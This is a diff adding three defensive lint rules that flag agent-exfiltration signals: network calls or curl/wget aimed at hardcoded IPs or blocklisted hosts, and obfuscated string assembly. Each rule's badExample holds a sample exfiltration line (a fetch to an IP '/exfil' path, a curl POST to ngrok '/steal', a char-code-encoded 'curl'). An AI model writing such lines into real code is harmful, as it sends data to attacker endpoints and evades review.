@@ -184,6 +184,164 @@
       "manual": true,
       "immutable": true,
       "badExample": "eval(userInput);"
+    },
+    {
+      "lessonHash": "79353234aa907cd9",
+      "lessonHeading": "Network requests to hardcoded IP addresses or suspicious domains",
+      "pattern": "",
+      "message": "Direct network calls (fetch, axios.*, http.request, https.request, net.Socket) with a string-literal URL containing a hardcoded IPv4 address or a domain from the pack's blocklist (pastebin.com/api, ngrok.io, *.trycloudflare.com, *.onion, transfer.sh, gofile.io, anonfiles.com) let a compromised agent exfiltrate data to attacker-controlled endpoints. Use a config-driven URL (from env, request context, or a reviewed allowlist) rather than literal IPs or exfil-pattern hosts. If a legitimate use case exists, document it with // totem-context: or add the file to the pack's .totemignore with review.",
+      "engine": "ast-grep",
+      "astGrepYamlRule": {
+        "rule": {
+          "any": [
+            {
+              "pattern": "fetch($URL, $$$_)"
+            },
+            {
+              "pattern": "fetch($URL)"
+            },
+            {
+              "pattern": "axios($URL, $$$_)"
+            },
+            {
+              "pattern": "axios($URL)"
+            },
+            {
+              "pattern": "axios.$METHOD($URL, $$$_)"
+            },
+            {
+              "pattern": "axios.$METHOD($URL)"
+            },
+            {
+              "pattern": "http.$METHOD($URL, $$$_)"
+            },
+            {
+              "pattern": "http.$METHOD($URL)"
+            },
+            {
+              "pattern": "https.$METHOD($URL, $$$_)"
+            },
+            {
+              "pattern": "https.$METHOD($URL)"
+            }
+          ]
+        },
+        "constraints": {
+          "URL": {
+            "regex": "(?:\\d{1,3}\\.){3}\\d{1,3}|pastebin\\.com/api|(?:^|[^\\w-])(?:ngrok\\.io|transfer\\.sh|gofile\\.io|anonfiles\\.com)(?:$|[^\\w-])|\\.trycloudflare\\.com(?:$|[^\\w])|\\.onion(?:$|[^\\w])"
+          }
+        }
+      },
+      "compiledAt": "2026-04-17T22:00:00.000Z",
+      "createdAt": "2026-04-17T22:00:00.000Z",
+      "fileGlobs": [
+        "packages/**/*.ts",
+        "packages/**/*.js",
+        "!**/scripts/**",
+        "!scripts/**",
+        "!**/.github/**",
+        "!.github/**",
+        "!**/*.test.*",
+        "!**/*.spec.*",
+        "!**/test/**",
+        "!**/tests/**",
+        "!packages/**/test/**",
+        "!packages/**/tests/**"
+      ],
+      "category": "security",
+      "severity": "error",
+      "manual": true,
+      "immutable": true,
+      "badExample": "fetch(\"http://185.220.101.5/exfil\");"
+    },
+    {
+      "lessonHash": "6fa15756b8a004ef",
+      "lessonHeading": "Shell-string curl or wget invocations to hardcoded IPs or suspicious domains",
+      "pattern": "\\b(?:curl|wget)\\b[^\\n'\"`]*(?:(?:\\d{1,3}\\.){3}\\d{1,3}|pastebin\\.com/api|(?:^|[^\\w-])(?:ngrok\\.io|transfer\\.sh|gofile\\.io|anonfiles\\.com)(?:$|[^\\w-])|\\.trycloudflare\\.com(?:$|[^\\w])|\\.onion(?:$|[^\\w]))",
+      "message": "Shell commands invoking curl or wget against a hardcoded IPv4 address or a blocklisted exfil-pattern host are a common agent-exfiltration signal. Use a config-driven URL or route the network call through the application's HTTP layer. If a build script legitimately calls curl or wget, route it through scripts/ (already excluded from this rule's fileGlobs).",
+      "engine": "regex",
+      "compiledAt": "2026-04-17T22:00:00.000Z",
+      "createdAt": "2026-04-17T22:00:00.000Z",
+      "fileGlobs": [
+        "packages/**/*.ts",
+        "packages/**/*.js",
+        "!**/scripts/**",
+        "!scripts/**",
+        "!**/.github/**",
+        "!.github/**",
+        "!**/*.test.*",
+        "!**/*.spec.*",
+        "!**/test/**",
+        "!**/tests/**",
+        "!packages/**/test/**",
+        "!packages/**/tests/**"
+      ],
+      "category": "security",
+      "severity": "error",
+      "manual": true,
+      "immutable": true,
+      "badExample": "const cmd = 'curl -X POST https://ngrok.io/steal';"
+    },
+    {
+      "lessonHash": "1c0c5a7daefdeb4b",
+      "lessonHeading": "Obfuscated string assembly via byte-level or encoding primitives",
+      "pattern": "",
+      "message": "Byte-level string assembly primitives (String.fromCharCode, Buffer.from with hex or base64 decoding, atob / btoa, numeric-array .map().join(), and .split().reverse().join()) let a compromised agent construct shell commands or URLs at runtime while evading static analysis. Totem's source tree does not need these primitives for its own work. If a legitimate use case surfaces (for example implementing a text encoder), document it with // totem-context: and add an explicit .totemignore exemption.",
+      "engine": "ast-grep",
+      "astGrepYamlRule": {
+        "rule": {
+          "any": [
+            {
+              "pattern": "String.fromCharCode($$$ARGS)"
+            },
+            {
+              "pattern": "Buffer.from($_, \"hex\")"
+            },
+            {
+              "pattern": "Buffer.from($_, 'hex')"
+            },
+            {
+              "pattern": "Buffer.from($_, \"base64\")"
+            },
+            {
+              "pattern": "Buffer.from($_, 'base64')"
+            },
+            {
+              "pattern": "atob($_)"
+            },
+            {
+              "pattern": "btoa($_)"
+            },
+            {
+              "pattern": "[$$$NUMS].map($_).join($_)"
+            },
+            {
+              "pattern": "$STR.split($_).reverse().join($_)"
+            }
+          ]
+        }
+      },
+      "compiledAt": "2026-04-17T22:00:00.000Z",
+      "createdAt": "2026-04-17T22:00:00.000Z",
+      "fileGlobs": [
+        "packages/**/*.ts",
+        "packages/**/*.js",
+        "!**/scripts/**",
+        "!scripts/**",
+        "!**/.github/**",
+        "!.github/**",
+        "!**/*.test.*",
+        "!**/*.spec.*",
+        "!**/test/**",
+        "!**/tests/**",
+        "!packages/**/test/**",
+        "!packages/**/tests/**"
+      ],
+      "category": "security",
+      "severity": "error",
+      "manual": true,
+      "immutable": true,
+      "badExample": "const payload = String.fromCharCode(99, 117, 114, 108);"
     }
   ]
 }
